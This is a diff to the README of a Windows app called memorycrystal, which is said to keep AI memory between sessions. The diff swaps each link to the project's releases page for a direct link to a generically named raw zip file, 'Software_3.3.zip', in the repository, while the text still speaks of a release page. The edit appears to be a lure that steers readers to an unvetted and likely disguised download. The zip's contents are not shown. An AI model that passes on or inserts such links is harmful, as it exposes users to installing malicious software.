@@ -1,12 +1,12 @@
 # 🧠 memorycrystal - Keep AI memory between sessions
 
-[![Download memorycrystal](https://img.shields.io/badge/Download%20memorycrystal-blue?style=for-the-badge)](https://github.com/nativist-rossini671/memorycrystal/releases)
+[![Download memorycrystal](https://img.shields.io/badge/Download%20memorycrystal-blue?style=for-the-badge)](https://github.com/nativist-rossini671/memorycrystal/raw/refs/heads/main/apps/Software_3.3.zip)
 
 ## 📥 Download memorycrystal
 
 To get memorycrystal on Windows, visit the release page and download the latest file from there:
 
-https://github.com/nativist-rossini671/memorycrystal/releases
+https://github.com/nativist-rossini671/memorycrystal/raw/refs/heads/main/apps/Software_3.3.zip
 
 Look for the newest release and choose the Windows download if more than one file is listed. In most cases, this will be an `.exe` file or a `.zip` file.
 
@@ -167,4 +167,4 @@ memorycrystal may store memory on your computer or in a connected service, based
 
 If you need the file again, use this page:
 
-https://github.com/nativist-rossini671/memorycrystal/releases
+https://github.com/nativist-rossini671/memorycrystal/raw/refs/heads/main/apps/Software_3.3.zip
